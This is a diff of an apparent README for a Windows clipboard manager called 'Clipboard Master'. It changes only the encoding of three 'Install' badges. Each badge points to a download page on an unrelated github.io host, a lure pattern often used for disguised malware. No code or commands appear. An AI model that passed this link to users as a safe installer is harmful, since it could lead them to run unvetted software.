@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Clipboard Master is a free, feature-rich clipboard manager for Windows that stor
 
 <div align="center">
 
-[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Clipboard Master is a free, feature-rich clipboard manager for Windows that stor
 
 <div align="center">
 
-[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Clipboard Master](https://img.shields.io/badge/⬇_Install_Clipboard+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
